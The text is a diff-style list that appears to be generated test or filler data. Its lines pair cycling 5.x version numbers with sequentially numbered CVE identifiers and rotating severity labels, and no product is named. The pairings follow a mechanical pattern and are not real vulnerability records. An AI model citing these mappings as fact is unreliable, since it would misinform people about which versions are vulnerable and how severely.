+5.13.8|CVE-2023-10928|severity:low
+5.14.9|CVE-2024-10929|severity:med
+5.0.0|CVE-2020-10930|severity:high
+5.1.1|CVE-2021-10931|severity:crit
+5.2.2|CVE-2022-10932|severity:low
+5.3.3|CVE-2023-10933|severity:med
+5.4.4|CVE-2024-10934|severity:high
+5.5.5|CVE-2020-10935|severity:crit
+5.6.6|CVE-2021-10936|severity:low
+5.7.7|CVE-2022-10937|severity:med
+5.8.8|CVE-2023-10938|severity:high
+5.9.9|CVE-2024-10939|severity:crit
+5.10.0|CVE-2020-10940|severity:low
+5.11.1|CVE-2021-10941|severity:med
+5.12.2|CVE-2022-10942|severity:high
+5.13.3|CVE-2023-10943|severity:crit
+5.14.4|CVE-2024-10944|severity:low
+5.0.5|CVE-2020-10945|severity:med
+5.1.6|CVE-2021-10946|severity:high
+5.2.7|CVE-2022-10947|severity:crit
+5.3.8|CVE-2023-10948|severity:low
+5.4.9|CVE-2024-10949|severity:med
+5.5.0|CVE-2020-10950|severity:high
+5.6.1|CVE-2021-10951|severity:crit
+5.7.2|CVE-2022-10952|severity:low
+5.8.3|CVE-2023-10953|severity:med
+5.9.4|CVE-2024-10954|severity:high
+5.10.5|CVE-2020-10955|severity:crit
+5.11.6|CVE-2021-10956|severity:low
+5.12.7|CVE-2022-10957|severity:med
+5.13.8|CVE-2023-10958|severity:high
+5.14.9|CVE-2024-10959|severity:crit
+5.0.0|CVE-2020-10960|severity:low
+5.1.1|CVE-2021-10961|severity:med
+5.2.2|CVE-2022-10962|severity:high
+5.3.3|CVE-2023-10963|severity:crit
+5.4.4|CVE-2024-10964|severity:low
+5.5.5|CVE-2020-10965|severity:med
+5.6.6|CVE-2021-10966|severity:high
+5.7.7|CVE-2022-10967|severity:crit
+5.8.8|CVE-2023-10968|severity:low
+5.9.9|CVE-2024-10969|severity:med
+5.10.0|CVE-2020-10970|severity:high
+5.11.1|CVE-2021-10971|severity:crit
+5.12.2|CVE-2022-10972|severity:low
+5.13.3|CVE-2023-10973|severity:med
+5.14.4|CVE-2024-10974|severity:high
+5.0.5|CVE-2020-10975|severity:crit
+5.1.6|CVE-2021-10976|severity:low
+5.2.7|CVE-2022-10977|severity:med
+5.3.8|CVE-2023-10978|severity:high
+5.4.9|CVE-2024-10979|severity:crit
+5.5.0|CVE-2020-10980|severity:low
+5.6.1|CVE-2021-10981|severity:med
+5.7.2|CVE-2022-10982|severity:high
+5.8.3|CVE-2023-10983|severity:crit
+5.9.4|CVE-2024-10984|severity:low
+5.10.5|CVE-2020-10985|severity:med
+5.11.6|CVE-2021-10986|severity:high
+5.12.7|CVE-2022-10987|severity:crit
+5.13.8|CVE-2023-10988|severity:low
+5.14.9|CVE-2024-10989|severity:med
+5.0.0|CVE-2020-10990|severity:high
+5.1.1|CVE-2021-10991|severity:crit
+5.2.2|CVE-2022-10992|severity:low
+5.3.3|CVE-2023-10993|severity:med
+5.4.4|CVE-2024-10994|severity:high
+5.5.5|CVE-2020-10995|severity:crit
+5.6.6|CVE-2021-10996|severity:low
+5.7.7|CVE-2022-10997|severity:med
+5.8.8|CVE-2023-10998|severity:high
+5.9.9|CVE-2024-10999|severity:crit
+5.10.0|CVE-2020-11000|severity:low
+5.11.1|CVE-2021-11001|severity:med
+5.12.2|CVE-2022-11002|severity:high
+5.13.3|CVE-2023-11003|severity:crit
+5.14.4|CVE-2024-11004|severity:low
+5.0.5|CVE-2020-11005|severity:med
+5.1.6|CVE-2021-11006|severity:high
+5.2.7|CVE-2022-11007|severity:crit
+5.3.8|CVE-2023-11008|severity:low
+5.4.9|CVE-2024-11009|severity:med
+5.5.0|CVE-2020-11010|severity:high
+5.6.1|CVE-2021-11011|severity:crit
+5.7.2|CVE-2022-11012|severity:low
+5.8.3|CVE-2023-11013|severity:med
+5.9.4|CVE-2024-11014|severity:high
+5.10.5|CVE-2020-11015|severity:crit
+5.11.6|CVE-2021-11016|severity:low
+5.12.7|CVE-2022-11017|severity:med
+5.13.8|CVE-2023-11018|severity:high
+5.14.9|CVE-2024-11019|severity:crit
+5.0.0|CVE-2020-11020|severity:low
+5.1.1|CVE-2021-11021|severity:med
+5.2.2|CVE-2022-11022|severity:high
+5.3.3|CVE-2023-11023|severity:crit
+5.4.4|CVE-2024-11024|severity:low
+5.5.5|CVE-2020-11025|severity:med
+5.6.6|CVE-2021-11026|severity:high
+5.7.7|CVE-2022-11027|severity:crit
+5.8.8|CVE-2023-11028|severity:low
+5.9.9|CVE-2024-11029|severity:med
+5.10.0|CVE-2020-11030|severity:high
+5.11.1|CVE-2021-11031|severity:crit
+5.12.2|CVE-2022-11032|severity:low
+5.13.3|CVE-2023-11033|severity:med
+5.14.4|CVE-2024-11034|severity:high
+5.0.5|CVE-2020-11035|severity:crit
+5.1.6|CVE-2021-11036|severity:low
+5.2.7|CVE-2022-11037|severity:med
+5.3.8|CVE-2023-11038|severity:high
+5.4.9|CVE-2024-11039|severity:crit
+5.5.0|CVE-2020-11040|severity:low
+5.6.1|CVE-2021-11041|severity:med
+5.7.2|CVE-2022-11042|severity:high
+5.8.3|CVE-2023-11043|severity:crit
+5.9.4|CVE-2024-11044|severity:low
+5.10.5|CVE-2020-11045|severity:med
+5.11.6|CVE-2021-11046|severity:high
+5.12.7|CVE-2022-11047|severity:crit
+5.13.8|CVE-2023-11048|severity:low
+5.14.9|CVE-2024-11049|severity:med
+5.0.0|CVE-2020-11050|severity:high
+5.1.1|CVE-2021-11051|severity:crit
+5.2.2|CVE-2022-11052|severity:low
+5.3.3|CVE-2023-11053|severity:med
+5.4.4|CVE-2024-11054|severity:high
+5.5.5|CVE-2020-11055|severity:crit
+5.6.6|CVE-2021-11056|severity:low
+5.7.7|CVE-2022-11057|severity:med
+5.8.8|CVE-2023-11058|severity:high
+5.9.9|CVE-2024-11059|severity:crit
+5.10.0|CVE-2020-11060|severity:low
+5.11.1|CVE-2021-11061|severity:med
+5.12.2|CVE-2022-11062|severity:high
+5.13.3|CVE-2023-11063|severity:crit
+5.14.4|CVE-2024-11064|severity:low
+5.0.5|CVE-2020-11065|severity:med
+5.1.6|CVE-2021-11066|severity:high
+5.2.7|CVE-2022-11067|severity:crit
+5.3.8|CVE-2023-11068|severity:low
+5.4.9|CVE-2024-11069|severity:med
+5.5.0|CVE-2020-11070|severity:high
+5.6.1|CVE-2021-11071|severity:crit
+5.7.2|CVE-2022-11072|severity:low
+5.8.3|CVE-2023-11073|severity:med
+5.9.4|CVE-2024-11074|severity:high
+5.10.5|CVE-2020-11075|severity:crit
+5.11.6|CVE-2021-11076|severity:low
+5.12.7|CVE-2022-11077|severity:med
+5.13.8|CVE-2023-11078|severity:high
+5.14.9|CVE-2024-11079|severity:crit
+5.0.0|CVE-2020-11080|severity:low
+5.1.1|CVE-2021-11081|severity:med
+5.2.2|CVE-2022-11082|severity:high
+5.3.3|CVE-2023-11083|severity:crit
+5.4.4|CVE-2024-11084|severity:low
+5.5.5|CVE-2020-11085|severity:med
+5.6.6|CVE-2021-11086|severity:high
+5.7.7|CVE-2022-11087|severity:crit
+5.8.8|CVE-2023-11088|severity:low
+5.9.9|CVE-2024-11089|severity:med
+5.10.0|CVE-2020-11090|severity:high
+5.11.1|CVE-2021-11091|severity:crit
+5.12.2|CVE-2022-11092|severity:low
+5.13.3|CVE-2023-11093|severity:med
+5.14.4|CVE-2024-11094|severity:high
+5.0.5|CVE-2020-11095|severity:crit
+5.1.6|CVE-2021-11096|severity:low
+5.2.7|CVE-2022-11097|severity:med
+5.3.8|CVE-2023-11098|severity:high
+5.4.9|CVE-2024-11099|severity:crit
+5.5.0|CVE-2020-11100|severity:low
+5.6.1|CVE-2021-11101|severity:med
+5.7.2|CVE-2022-11102|severity:high
+5.8.3|CVE-2023-11103|severity:crit
+5.9.4|CVE-2024-11104|severity:low
+5.10.5|CVE-2020-11105|severity:med
+5.11.6|CVE-2021-11106|severity:high
+5.12.7|CVE-2022-11107|severity:crit
+5.13.8|CVE-2023-11108|severity:low
+5.14.9|CVE-2024-11109|severity:med
+5.0.0|CVE-2020-11110|severity:high
+5.1.1|CVE-2021-11111|severity:crit
+5.2.2|CVE-2022-11112|severity:low
+5.3.3|CVE-2023-11113|severity:med
+5.4.4|CVE-2024-11114|severity:high
+5.5.5|CVE-2020-11115|severity:crit
+5.6.6|CVE-2021-11116|severity:low
+5.7.7|CVE-2022-11117|severity:med
+5.8.8|CVE-2023-11118|severity:high
+5.9.9|CVE-2024-11119|severity:crit
+5.10.0|CVE-2020-11120|severity:low
+5.11.1|CVE-2021-11121|severity:med
+5.12.2|CVE-2022-11122|severity:high
+5.13.3|CVE-2023-11123|severity:crit
+5.14.4|CVE-2024-11124|severity:low
+5.0.5|CVE-2020-11125|severity:med
+5.1.6|CVE-2021-11126|severity:high
+5.2.7|CVE-2022-11127|severity:crit
+5.3.8|CVE-2023-11128|severity:low
+5.4.9|CVE-2024-11129|severity:med
+5.5.0|CVE-2020-11130|severity:high
+5.6.1|CVE-2021-11131|severity:crit
+5.7.2|CVE-2022-11132|severity:low
+5.8.3|CVE-2023-11133|severity:med
+5.9.4|CVE-2024-11134|severity:high
+5.10.5|CVE-2020-11135|severity:crit
+5.11.6|CVE-2021-11136|severity:low
+5.12.7|CVE-2022-11137|severity:med
+5.13.8|CVE-2023-11138|severity:high
+5.14.9|CVE-2024-11139|severity:crit
+5.0.0|CVE-2020-11140|severity:low
+5.1.1|CVE-2021-11141|severity:med
+5.2.2|CVE-2022-11142|severity:high
+5.3.3|CVE-2023-11143|severity:crit
+5.4.4|CVE-2024-11144|severity:low
+5.5.5|CVE-2020-11145|severity:med
+5.6.6|CVE-2021-11146|severity:high
+5.7.7|CVE-2022-11147|severity:crit
+5.8.8|CVE-2023-11148|severity:low
+5.9.9|CVE-2024-11149|severity:med
+5.10.0|CVE-2020-11150|severity:high
+5.11.1|CVE-2021-11151|severity:crit
+5.12.2|CVE-2022-11152|severity:low
+5.13.3|CVE-2023-11153|severity:med
+5.14.4|CVE-2024-11154|severity:high
+5.0.5|CVE-2020-11155|severity:crit
+5.1.6|CVE-2021-11156|severity:low
+5.2.7|CVE-2022-11157|severity:med
+5.3.8|CVE-2023-11158|severity:high
+5.4.9|CVE-2024-11159|severity:crit
+5.5.0|CVE-2020-11160|severity:low
+5.6.1|CVE-2021-11161|severity:med
+5.7.2|CVE-2022-11162|severity:high
+5.8.3|CVE-2023-11163|severity:crit
+5.9.4|CVE-2024-11164|severity:low
+5.10.5|CVE-2020-11165|severity:med
+5.11.6|CVE-2021-11166|severity:high
+5.12.7|CVE-2022-11167|severity:crit
+5.13.8|CVE-2023-11168|severity:low
+5.14.9|CVE-2024-11169|severity:med
+5.0.0|CVE-2020-11170|severity:high
+5.1.1|CVE-2021-11171|severity:crit
+5.2.2|CVE-2022-11172|severity:low
+5.3.3|CVE-2023-11173|severity:med
+5.4.4|CVE-2024-11174|severity:high
+5.5.5|CVE-2020-11175|severity:crit
+5.6.6|CVE-2021-11176|severity:low
+5.7.7|CVE-2022-11177|severity:med
+5.8.8|CVE-2023-11178|severity:high
+5.9.9|CVE-2024-11179|severity:crit
+5.10.0|CVE-2020-11180|severity:low
+5.11.1|CVE-2021-11181|severity:med
+5.12.2|CVE-2022-11182|severity:high
+5.13.3|CVE-2023-11183|severity:crit
+5.14.4|CVE-2024-11184|severity:low
+5.0.5|CVE-2020-11185|severity:med
+5.1.6|CVE-2021-11186|severity:high
+5.2.7|CVE-2022-11187|severity:crit
+5.3.8|CVE-2023-11188|severity:low
+5.4.9|CVE-2024-11189|severity:med
+5.5.0|CVE-2020-11190|severity:high
+5.6.1|CVE-2021-11191|severity:crit
+5.7.2|CVE-2022-11192|severity:low
+5.8.3|CVE-2023-11193|severity:med
+5.9.4|CVE-2024-11194|severity:high
+5.10.5|CVE-2020-11195|severity:crit
+5.11.6|CVE-2021-11196|severity:low
+5.12.7|CVE-2022-11197|severity:med
+5.13.8|CVE-2023-11198|severity:high
+5.14.9|CVE-2024-11199|severity:crit
+5.0.0|CVE-2020-11200|severity:low
+5.1.1|CVE-2021-11201|severity:med
+5.2.2|CVE-2022-11202|severity:high
+5.3.3|CVE-2023-11203|severity:crit
+5.4.4|CVE-2024-11204|severity:low
+5.5.5|CVE-2020-11205|severity:med
+5.6.6|CVE-2021-11206|severity:high
+5.7.7|CVE-2022-11207|severity:crit
+5.8.8|CVE-2023-11208|severity:low
+5.9.9|CVE-2024-11209|severity:med
+5.10.0|CVE-2020-11210|severity:high
+5.11.1|CVE-2021-11211|severity:crit
+5.12.2|CVE-2022-11212|severity:low
+5.13.3|CVE-2023-11213|severity:med
+5.14.4|CVE-2024-11214|severity:high
+5.0.5|CVE-2020-11215|severity:crit
+5.1.6|CVE-2021-11216|severity:low
+5.2.7|CVE-2022-11217|severity:med
+5.3.8|CVE-2023-11218|severity:high
+5.4.9|CVE-2024-11219|severity:crit
+5.5.0|CVE-2020-11220|severity:low
+5.6.1|CVE-2021-11221|severity:med
+5.7.2|CVE-2022-11222|severity:high
+5.8.3|CVE-2023-11223|severity:crit
+5.9.4|CVE-2024-11224|severity:low
+5.10.5|CVE-2020-11225|severity:med
+5.11.6|CVE-2021-11226|severity:high
+5.12.7|CVE-2022-11227|severity:crit
+5.13.8|CVE-2023-11228|severity:low
+5.14.9|CVE-2024-11229|severity:med
+5.0.0|CVE-2020-11230|severity:high
+5.1.1|CVE-2021-11231|severity:crit
+5.2.2|CVE-2022-11232|severity:low
+5.3.3|CVE-2023-11233|severity:med
+5.4.4|CVE-2024-11234|severity:high
+5.5.5|CVE-2020-11235|severity:crit
+5.6.6|CVE-2021-11236|severity:low
+5.7.7|CVE-2022-11237|severity:med
+5.8.8|CVE-2023-11238|severity:high
+5.9.9|CVE-2024-11239|severity:crit
+5.10.0|CVE-2020-11240|severity:low
+5.11.1|CVE-2021-11241|severity:med
+5.12.2|CVE-2022-11242|severity:high
+5.13.3|CVE-2023-11243|severity:crit
+5.14.4|CVE-2024-11244|severity:low
+5.0.5|CVE-2020-11245|severity:med
+5.1.6|CVE-2021-11246|severity:high
+5.2.7|CVE-2022-11247|severity:crit
+5.3.8|CVE-2023-11248|severity:low
+5.4.9|CVE-2024-11249|severity:med
+5.5.0|CVE-2020-11250|severity:high
+5.6.1|CVE-2021-11251|severity:crit
+5.7.2|CVE-2022-11252|severity:low
+5.8.3|CVE-2023-11253|severity:med
+5.9.4|CVE-2024-11254|severity:high
+5.10.5|CVE-2020-11255|severity:crit
+5.11.6|CVE-2021-11256|severity:low
+5.12.7|CVE-2022-11257|severity:med
+5.13.8|CVE-2023-11258|severity:high
+5.14.9|CVE-2024-11259|severity:crit
+5.0.0|CVE-2020-11260|severity:low
+5.1.1|CVE-2021-11261|severity:med
+5.2.2|CVE-2022-11262|severity:high
+5.3.3|CVE-2023-11263|severity:crit
+5.4.4|CVE-2024-11264|severity:low
+5.5.5|CVE-2020-11265|severity:med
+5.6.6|CVE-2021-11266|severity:high
+5.7.7|CVE-2022-11267|severity:crit
+5.8.8|CVE-2023-11268|severity:low
+5.9.9|CVE-2024-11269|severity:med
+5.10.0|CVE-2020-11270|severity:high
+5.11.1|CVE-2021-11271|severity:crit
+5.12.2|CVE-2022-11272|severity:low
+5.13.3|CVE-2023-11273|severity:med
+5.14.4|CVE-2024-11274|severity:high
+5.0.5|CVE-2020-11275|severity:crit
+5.1.6|CVE-2021-11276|severity:low
+5.2.7|CVE-2022-11277|severity:med
+5.3.8|CVE-2023-11278|severity:high
+5.4.9|CVE-2024-11279|severity:crit
+5.5.0|CVE-2020-11280|severity:low
+5.6.1|CVE-2021-11281|severity:med
+5.7.2|CVE-2022-11282|severity:high
+5.8.3|CVE-2023-11283|severity:crit
+5.9.4|CVE-2024-11284|severity:low
+5.10.5|CVE-2020-11285|severity:med
+5.11.6|CVE-2021-11286|severity:high
+5.12.7|CVE-2022-11287|severity:crit
+5.13.8|CVE-2023-11288|severity:low
+5.14.9|CVE-2024-11289|severity:med
+5.0.0|CVE-2020-11290|severity:high
+5.1.1|CVE-2021-11291|severity:crit
+5.2.2|CVE-2022-11292|severity:low
+5.3.3|CVE-2023-11293|severity:med
+5.4.4|CVE-2024-11294|severity:high
+5.5.5|CVE-2020-11295|severity:crit
+5.6.6|CVE-2021-11296|severity:low
+5.7.7|CVE-2022-11297|severity:med
+5.8.8|CVE-2023-11298|severity:high
+5.9.9|CVE-2024-11299|severity:crit
+5.10.0|CVE-2020-11300|severity:low
+5.11.1|CVE-2021-11301|severity:med
+5.12.2|CVE-2022-11302|severity:high
+5.13.3|CVE-2023-11303|severity:crit
+5.14.4|CVE-2024-11304|severity:low
+5.0.5|CVE-2020-11305|severity:med
+5.1.6|CVE-2021-11306|severity:high
+5.2.7|CVE-2022-11307|severity:crit
+5.3.8|CVE-2023-11308|severity:low
+5.4.9|CVE-2024-11309|severity:med
+5.5.0|CVE-2020-11310|severity:high
+5.6.1|CVE-2021-11311|severity:crit
+5.7.2|CVE-2022-11312|severity:low
+5.8.3|CVE-2023-11313|severity:med
+5.9.4|CVE-2024-11314|severity:high
+5.10.5|CVE-2020-11315|severity:crit
+5.11.6|CVE-2021-11316|severity:low
+5.12.7|CVE-2022-11317|severity:med
+5.13.8|CVE-2023-11318|severity:high
+5.14.9|CVE-2024-11319|severity:crit
+5.0.0|CVE-2020-11320|severity:low
+5.1.1|CVE-2021-11321|severity:med
+5.2.2|CVE-2022-11322|severity:high
+5.3.3|CVE-2023-11323|severity:crit
+5.4.4|CVE-2024-11324|severity:low
+5.5.5|CVE-2020-11325|severity:med
+5.6.6|CVE-2021-11326|severity:high
+5.7.7|CVE-2022-11327|severity:crit
+5.8.8|CVE-2023-11328|severity:low
+5.9.9|CVE-2024-11329|severity:med
+5.10.0|CVE-2020-11330|severity:high
+5.11.1|CVE-2021-11331|severity:crit
+5.12.2|CVE-2022-11332|severity:low
+5.13.3|CVE-2023-11333|severity:med
+5.14.4|CVE-2024-11334|severity:high
+5.0.5|CVE-2020-11335|severity:crit
+5.1.6|CVE-2021-11336|severity:low
+5.2.7|CVE-2022-11337|severity:med
+5.3.8|CVE-2023-11338|severity:high
+5.4.9|CVE-2024-11339|severity:crit
+5.5.0|CVE-2020-11340|severity:low
+5.6.1|CVE-2021-11341|severity:med
+5.7.2|CVE-2022-11342|severity:high
+5.8.3|CVE-2023-11343|severity:crit
+5.9.4|CVE-2024-11344|severity:low
+5.10.5|CVE-2020-11345|severity:med
+5.11.6|CVE-2021-11346|severity:high
+5.12.7|CVE-2022-11347|severity:crit
+5.13.8|CVE-2023-11348|severity:low
+5.14.9|CVE-2024-11349|severity:med
+5.0.0|CVE-2020-11350|severity:high
+5.1.1|CVE-2021-11351|severity:crit
+5.2.2|CVE-2022-11352|severity:low
+5.3.3|CVE-2023-11353|severity:med
+5.4.4|CVE-2024-11354|severity:high
+5.5.5|CVE-2020-11355|severity:crit
+5.6.6|CVE-2021-11356|severity:low
+5.7.7|CVE-2022-11357|severity:med
+5.8.8|CVE-2023-11358|severity:high
+5.9.9|CVE-2024-11359|severity:crit
+5.10.0|CVE-2020-11360|severity:low
+5.11.1|CVE-2021-11361|severity:med
+5.12.2|CVE-2022-11362|severity:high
+5.13.3|CVE-2023-11363|severity:crit
+5.14.4|CVE-2024-11364|severity:low
+5.0.5|CVE-2020-11365|severity:med
+5.1.6|CVE-2021-11366|severity:high
+5.2.7|CVE-2022-11367|severity:crit
+5.3.8|CVE-2023-11368|severity:low
+5.4.9|CVE-2024-11369|severity:med
+5.5.0|CVE-2020-11370|severity:high
+5.6.1|CVE-2021-11371|severity:crit
+5.7.2|CVE-2022-11372|severity:low
+5.8.3|CVE-2023-11373|severity:med
+5.9.4|CVE-2024-11374|severity:high
+5.10.5|CVE-2020-11375|severity:crit
+5.11.6|CVE-2021-11376|severity:low
+5.12.7|CVE-2022-11377|severity:med
+5.13.8|CVE-2023-11378|severity:high
+5.14.9|CVE-2024-11379|severity:crit
+5.0.0|CVE-2020-11380|severity:low
+5.1.1|CVE-2021-11381|severity:med
+5.2.2|CVE-2022-11382|severity:high
+5.3.3|CVE-2023-11383|severity:crit
+5.4.4|CVE-2024-11384|severity:low
+5.5.5|CVE-2020-11385|severity:med
+5.6.6|CVE-2021-11386|severity:high
+5.7.7|CVE-2022-11387|severity:crit
+5.8.8|CVE-2023-11388|severity:low
+5.9.9|CVE-2024-11389|severity:med
+5.10.0|CVE-2020-11390|severity:high
+5.11.1|CVE-2021-11391|severity:crit
+5.12.2|CVE-2022-11392|severity:low
+5.13.3|CVE-2023-11393|severity:med
+5.14.4|CVE-2024-11394|severity:high
+5.0.5|CVE-2020-11395|severity:crit
+5.1.6|CVE-2021-11396|severity:low
+5.2.7|CVE-2022-11397|severity:med
+5.3.8|CVE-2023-11398|severity:high
+5.4.9|CVE-2024-11399|severity:crit
+5.5.0|CVE-2020-11400|severity:low
+5.6.1|CVE-2021-11401|severity:med
+5.7.2|CVE-2022-11402|severity:high
+5.8.3|CVE-2023-11403|severity:crit
+5.9.4|CVE-2024-11404|severity:low
+5.10.5|CVE-2020-11405|severity:med
+5.11.6|CVE-2021-11406|severity:high
+5.12.7|CVE-2022-11407|severity:crit
+5.13.8|CVE-2023-11408|severity:low
+5.14.9|CVE-2024-11409|severity:med
+5.0.0|CVE-2020-11410|severity:high
+5.1.1|CVE-2021-11411|severity:crit
+5.2.2|CVE-2022-11412|severity:low
+5.3.3|CVE-2023-11413|severity:med
+5.4.4|CVE-2024-11414|severity:high
+5.5.5|CVE-2020-11415|severity:crit
+5.6.6|CVE-2021-11416|severity:low
+5.7.7|CVE-2022-11417|severity:med
+5.8.8|CVE-2023-11418|severity:high
+5.9.9|CVE-2024-11419|severity:crit
+5.10.0|CVE-2020-11420|severity:low
+5.11.1|CVE-2021-11421|severity:med
+5.12.2|CVE-2022-11422|severity:high
+5.13.3|CVE-2023-11423|severity:crit
+5.14.4|CVE-2024-11424|severity:low
+5.0.5|CVE-2020-11425|severity:med
+5.1.6|CVE-2021-11426|severity:high
+5.2.7|CVE-2022-11427|severity:crit
+5.3.8|CVE-2023-11428|severity:low
+5.4.9|CVE-2024-11429|severity:med
+5.5.0|CVE-2020-11430|severity:high
+5.6.1|CVE-2021-11431|severity:crit
+5.7.2|CVE-2022-11432|severity:low
+5.8.3|CVE-2023-11433|severity:med
+5.9.4|CVE-2024-11434|severity:high
+5.10.5|CVE-2020-11435|severity:crit
+5.11.6|CVE-2021-11436|severity:low
+5.12.7|CVE-2022-11437|severity:med
+5.13.8|CVE-2023-11438|severity:high
+5.14.9|CVE-2024-11439|severity:crit
+5.0.0|CVE-2020-11440|severity:low
+5.1.1|CVE-2021-11441|severity:med
+5.2.2|CVE-2022-11442|severity:high
+5.3.3|CVE-2023-11443|severity:crit
+5.4.4|CVE-2024-11444|severity:low
+5.5.5|CVE-2020-11445|severity:med
+5.6.6|CVE-2021-11446|severity:high
+5.7.7|CVE-2022-11447|severity:crit
+5.8.8|CVE-2023-11448|severity:low
+5.9.9|CVE-2024-11449|severity:med
+5.10.0|CVE-2020-11450|severity:high
+5.11.1|CVE-2021-11451|severity:crit
+5.12.2|CVE-2022-11452|severity:low
+5.13.3|CVE-2023-11453|severity:med
+5.14.4|CVE-2024-11454|severity:high
+5.0.5|CVE-2020-11455|severity:crit
+5.1.6|CVE-2021-11456|severity:low
+5.2.7|CVE-2022-11457|severity:med
+5.3.8|CVE-2023-11458|severity:high
+5.4.9|CVE-2024-11459|severity:crit
+5.5.0|CVE-2020-11460|severity:low
+5.6.1|CVE-2021-11461|severity:med
+5.7.2|CVE-2022-11462|severity:high
+5.8.3|CVE-2023-11463|severity:crit
+5.9.4|CVE-2024-11464|severity:low
+5.10.5|CVE-2020-11465|severity:med
+5.11.6|CVE-2021-11466|severity:high
+5.12.7|CVE-2022-11467|severity:crit
+5.13.8|CVE-2023-11468|severity:low
+5.14.9|CVE-2024-11469|severity:med
+5.0.0|CVE-2020-11470|severity:high
+5.1.1|CVE-2021-11471|severity:crit
+5.2.2|CVE-2022-11472|severity:low
+5.3.3|CVE-2023-11473|severity:med
+5.4.4|CVE-2024-11474|severity:high
+5.5.5|CVE-2020-11475|severity:crit
+5.6.6|CVE-2021-11476|severity:low
+5.7.7|CVE-2022-11477|severity:med
+5.8.8|CVE-2023-11478|severity:high
+5.9.9|CVE-2024-11479|severity:crit
+5.10.0|CVE-2020-11480|severity:low
+5.11.1|CVE-2021-11481|severity:med
+5.12.2|CVE-2022-11482|severity:high
+5.13.3|CVE-2023-11483|severity:crit
+5.14.4|CVE-2024-11484|severity:low
+5.0.5|CVE-2020-11485|severity:med
+5.1.6|CVE-2021-11486|severity:high
+5.2.7|CVE-2022-11487|severity:crit
+5.3.8|CVE-2023-11488|severity:low
+5.4.9|CVE-2024-11489|severity:med
+5.5.0|CVE-2020-11490|severity:high
+5.6.1|CVE-2021-11491|severity:crit
+5.7.2|CVE-2022-11492|severity:low
+5.8.3|CVE-2023-11493|severity:med
+5.9.4|CVE-2024-11494|severity:high
+5.10.5|CVE-2020-11495|severity:crit
+5.11.6|CVE-2021-11496|severity:low
+5.12.7|CVE-2022-11497|severity:med
+5.13.8|CVE-2023-11498|severity:high
+5.14.9|CVE-2024-11499|severity:crit
+5.0.0|CVE-2020-11500|severity:low
+5.1.1|CVE-2021-11501|severity:med
+5.2.2|CVE-2022-11502|severity:high
+5.3.3|CVE-2023-11503|severity:crit
+5.4.4|CVE-2024-11504|severity:low
+5.5.5|CVE-2020-11505|severity:med
+5.6.6|CVE-2021-11506|severity:high
+5.7.7|CVE-2022-11507|severity:crit
+5.8.8|CVE-2023-11508|severity:low
+5.9.9|CVE-2024-11509|severity:med
+5.10.0|CVE-2020-11510|severity:high
+5.11.1|CVE-2021-11511|severity:crit
+5.12.2|CVE-2022-11512|severity:low
+5.13.3|CVE-2023-11513|severity:med
+5.14.4|CVE-2024-11514|severity:high
+5.0.5|CVE-2020-11515|severity:crit
+5.1.6|CVE-2021-11516|severity:low
+5.2.7|CVE-2022-11517|severity:med
+5.3.8|CVE-2023-11518|severity:high
+5.4.9|CVE-2024-11519|severity:crit
+5.5.0|CVE-2020-11520|severity:low
+5.6.1|CVE-2021-11521|severity:med
+5.7.2|CVE-2022-11522|severity:high
+5.8.3|CVE-2023-11523|severity:crit
+5.9.4|CVE-2024-11524|severity:low
+5.10.5|CVE-2020-11525|severity:med
+5.11.6|CVE-2021-11526|severity:high
+5.12.7|CVE-2022-11527|severity:crit
+5.13.8|CVE-2023-11528|severity:low
+5.14.9|CVE-2024-11529|severity:med
+5.0.0|CVE-2020-11530|severity:high
+5.1.1|CVE-2021-11531|severity:crit
+5.2.2|CVE-2022-11532|severity:low
+5.3.3|CVE-2023-11533|severity:med
+5.4.4|CVE-2024-11534|severity:high
+5.5.5|CVE-2020-11535|severity:crit
+5.6.6|CVE-2021-11536|severity:low
+5.7.7|CVE-2022-11537|severity:med
+5.8.8|CVE-2023-11538|severity:high
+5.9.9|CVE-2024-11539|severity:crit
+5.10.0|CVE-2020-11540|severity:low
+5.11.1|CVE-2021-11541|severity:med
+5.12.2|CVE-2022-11542|severity:high
+5.13.3|CVE-2023-11543|severity:crit
+5.14.4|CVE-2024-11544|severity:low
+5.0.5|CVE-2020-11545|severity:med
+5.1.6|CVE-2021-11546|severity:high
+5.2.7|CVE-2022-11547|severity:crit
+5.3.8|CVE-2023-11548|severity:low
+5.4.9|CVE-2024-11549|severity:med
+5.5.0|CVE-2020-11550|severity:high
+5.6.1|CVE-2021-11551|severity:crit
+5.7.2|CVE-2022-11552|severity:low
+5.8.3|CVE-2023-11553|severity:med
+5.9.4|CVE-2024-11554|severity:high
+5.10.5|CVE-2020-11555|severity:crit
+5.11.6|CVE-2021-11556|severity:low
+5.12.7|CVE-2022-11557|severity:med
+5.13.8|CVE-2023-11558|severity:high
+5.14.9|CVE-2024-11559|severity:crit
+5.0.0|CVE-2020-11560|severity:low
+5.1.1|CVE-2021-11561|severity:med
+5.2.2|CVE-2022-11562|severity:high
+5.3.3|CVE-2023-11563|severity:crit
+5.4.4|CVE-2024-11564|severity:low
+5.5.5|CVE-2020-11565|severity:med
+5.6.6|CVE-2021-11566|severity:high
+5.7.7|CVE-2022-11567|severity:crit
+5.8.8|CVE-2023-11568|severity:low
+5.9.9|CVE-2024-11569|severity:med
+5.10.0|CVE-2020-11570|severity:high
+5.11.1|CVE-2021-11571|severity:crit
+5.12.2|CVE-2022-11572|severity:low
+5.13.3|CVE-2023-11573|severity:med
+5.14.4|CVE-2024-11574|severity:high
+5.0.5|CVE-2020-11575|severity:crit
+5.1.6|CVE-2021-11576|severity:low
+5.2.7|CVE-2022-11577|severity:med
+5.3.8|CVE-2023-11578|severity:high
+5.4.9|CVE-2024-11579|severity:crit
+5.5.0|CVE-2020-11580|severity:low
+5.6.1|CVE-2021-11581|severity:med
+5.7.2|CVE-2022-11582|severity:high
+5.8.3|CVE-2023-11583|severity:crit
+5.9.4|CVE-2024-11584|severity:low
+5.10.5|CVE-2020-11585|severity:med
+5.11.6|CVE-2021-11586|severity:high
+5.12.7|CVE-2022-11587|severity:crit
+5.13.8|CVE-2023-11588|severity:low
+5.14.9|CVE-2024-11589|severity:med
+5.0.0|CVE-2020-11590|severity:high
+5.1.1|CVE-2021-11591|severity:crit
+5.2.2|CVE-2022-11592|severity:low
+5.3.3|CVE-2023-11593|severity:med
+5.4.4|CVE-2024-11594|severity:high
+5.5.5|CVE-2020-11595|severity:crit
+5.6.6|CVE-2021-11596|severity:low
+5.7.7|CVE-2022-11597|severity:med
+5.8.8|CVE-2023-11598|severity:high
+5.9.9|CVE-2024-11599|severity:crit
+5.10.0|CVE-2020-11600|severity:low
+5.11.1|CVE-2021-11601|severity:med
